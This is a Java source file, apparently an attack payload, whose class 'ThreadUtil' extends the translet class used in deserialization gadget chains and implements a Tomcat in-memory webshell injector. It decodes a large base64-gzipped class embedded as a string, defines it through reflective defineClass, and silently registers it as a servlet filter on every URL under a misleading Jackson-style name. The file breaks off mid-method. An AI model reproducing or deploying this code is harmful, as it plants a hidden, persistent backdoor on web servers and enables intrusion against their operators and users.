package com.example.frchannel.payload;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.*;
import java.util.zip.GZIPInputStream;

public class ThreadUtil extends AbstractTranslet {
    public String getUrlPattern() {
        return "/*";
    }

    public String getClassName() {
        return "com.fasterxml.jackson.ServletContextAttributeOpFilter";
    }

    public String getBase64String() throws IOException {
        return new String("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");
    }

    public ThreadUtil() {
        try {
            List<Object> contexts = this.getContext();
            Iterator var2 = contexts.iterator();

            while(var2.hasNext()) {
                Object context = var2.next();
                Object filter = this.getFilter(context);
                this.addFilter(context, filter);
            }
        } catch (Exception var5) {
        }

    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    public List<Object> getContext() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        List<Object> contexts = new ArrayList();
        Thread[] threads = (Thread[])((Thread[])invokeMethod(Thread.class, "getThreads"));
        Object context = null;

        try {
            Thread[] var15 = threads;
            int var5 = threads.length;

            for(int var6 = 0; var6 < var5; ++var6) {
                Thread thread = var15[var6];
                if (thread.getName().contains("ContainerBackgroundProcessor") && context == null) {
                    HashMap childrenMap = (HashMap)getFV(getFV(getFV(thread, "target"), "this$0"), "children");
                    Iterator var9 = childrenMap.keySet().iterator();

                    while(var9.hasNext()) {
                        Object key = var9.next();
                        HashMap children = (HashMap)getFV(childrenMap.get(key), "children");
                        Iterator var12 = children.keySet().iterator();

                        while(var12.hasNext()) {
                            Object key1 = var12.next();
                            context = children.get(key1);
                            if (context != null && context.getClass().getName().contains("StandardContext")) {
                                contexts.add(context);
                            }

                            if (context != null && context.getClass().getName().contains("TomcatEmbeddedContext")) {
                                contexts.add(context);
                            }
                        }
                    }
                } else if (thread.getContextClassLoader() != null && (thread.getContextClassLoader().getClass().toString().contains("ParallelWebappClassLoader") || thread.getContextClassLoader().getClass().toString().contains("TomcatEmbeddedWebappClassLoader"))) {
                    context = getFV(getFV(thread.getContextClassLoader(), "resources"), "context");
                    if (context != null && context.getClass().getName().contains("StandardContext")) {
                        contexts.add(context);
                    }

                    if (context != null && context.getClass().getName().contains("TomcatEmbeddedContext")) {
                        contexts.add(context);
                    }
                }
            }

            return contexts;
        } catch (Exception var14) {
            Exception e = var14;
            throw new RuntimeException(e);
        }
    }

    private Object getFilter(Object context) {
        Object filter = null;
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        if (classLoader == null) {
            classLoader = context.getClass().getClassLoader();
        }

        try {
            filter = classLoader.loadClass(this.getClassName());
        } catch (Exception var9) {
            try {
                byte[] clazzByte = gzipDecompress(decodeBase64(this.getBase64String()));
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                defineClass.setAccessible(true);
                Class clazz = (Class)defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
                filter = clazz.newInstance();
            } catch (Throwable var8) {
            }
        }

        return filter;
    }

    public String getFilterName(String className) {
        if (className.contains(".")) {
            int lastDotIndex = className.lastIndexOf(".");
            return className.substring(lastDotIndex + 1);
        } else {
            return className;
        }
    }

    public void addFilter(Object context, Object filter) throws InvocationTargetException, NoSuchMethodException, IllegalAccessException, ClassNotFoundException, InstantiationException {
        ClassLoader catalinaLoader = this.getCatalinaLoader();
        String filterClassName = this.getClassName();
        String filterName = this.getFilterName(filterClassName);

        try {
            if (invokeMethod(context, "findFilterDef", new Class[]{String.class}, new Object[]{filterName}) != null) {
                return;
            }
        } catch (Exception var16) {
        }

        Object filterDef;
        Object filterMap;
        try {
            filterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef").newInstance();
            filterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap").newInstance();
        } catch (Exception var15) {
            try {
                filterDef = Class.forName("org.apache.catalina.deploy.FilterDef").newInstance();
                filterMap = Class.forName("org.apache.catalina.deploy.FilterMap").newInstance();
            } catch (Exception var14) {
                filterDef = Class.forName("org.apache.catalina.deploy.FilterDef", true, catalinaLoader).newInstance();
                filterMap = Class.forName("org.apache.catalina.deploy.FilterMap", true, catalinaLoader).newInstance();
            }
        }

        try {
            invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
            invokeMethod(filterDef, "setFilterClass", new Class[]{String.class}, new Object[]{filterClassName});
            invokeMethod(context, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
            invokeMethod(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
            invokeMethod(filterMap, "setDispatcher", new Class[]{String.class}, new Object[]{"REQUEST"});

            Constructor[] constructors;
            try {
                invokeMethod(filterMap, "addURLPattern", new Class[]{String.class}, new Object[]{this.getUrlPattern()});
                constructors = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructors();
            } catch (Exception var12) {
                invokeMethod(filterMap, "setURLPattern", new Class[]{String.class}, new Object[]{this.getUrlPattern()});
                constructors = Class.forName("org.apache.catalina.core.ApplicationFilterConfig", true, catalinaLoader).getDeclaredConstructors();
            }

            try {
                invokeMethod(context, "addFilterMapBefore", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
            } catch (Exception var11) {
                invokeMethod(context, "addFilterMap", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
            }

            constructors[0].setAccessible(true);
            Object filterConfig = constructors[0].newInstance(context, filterDef);
            Map filterConfigs = (Map)getFV(context, "filterConfigs");
            filterConfigs.put(filterName, filterConfig);
        } catch (Exception var13) {
            Exception e = var13;
            e.printStackTrace();
        }

    }

    public ClassLoader getCatalinaLoader() throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Thread[] threads = (Thread[])((Thread[])invokeMethod(Thread.class, "getThreads"));
        ClassLoader catalinaLoader = null;

        for(int i = 0; i < threads.length; ++i) {
            if (threads[i].getName().contains("ContainerBackgroundProcessor")) {
                catalinaLoader = threads[i].getContextClassLoader();
                break;
            }
        }

        return catalinaLoader;
    }

    static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class decoderClass;
        try {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[])((byte[])decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str));
        } catch (Exception var4) {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke((Object)null);
            return (byte[])((byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str));
        }
    }

    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ByteArrayInputStream in = new ByteArrayInputStream(compressedData);
        GZIPInputStream ungzip = new GZIPInputStream(in);
        byte[] buffer = new byte[256];

        int n;
        while((n = ungzip.read(buffer)) >= 0) {
            out.write(buffer, 0, n);
        }

        return out.toByteArray();
    }

    static Object getFV(Object obj, String fieldName) throws Exception {
        Field field = getF(obj, fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    static Field getF(Object obj, String fieldName) throws NoSuchFieldException {
        Class<?> clazz = obj.getClass();

        while(clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field;
            } catch (NoSuchFieldException var4) {
                clazz = clazz.getSuperclass();
            }
        }

        throw new NoSuchFieldException(fieldName);
    }

    static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
    }

    public static synchronized Object invokeMethod(Object obj, String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class clazz = obj instanceof Class ? (Class)obj : obj.getClass();
        Method method = null;
        Class tempClass = clazz;

        while(method == null && tempClass != null) {
            try {
                if (paramClazz == null) {
                    Method[] methods = tempClass.getDeclaredMethods();

                    for(int i = 0; i < methods.length; ++i) {
                        if (methods[i].getName().equals(methodName) && methods[i].getParameterTypes().length == 0) {
                            method = methods[i];
                            break;
                        }
                    }
                } else {
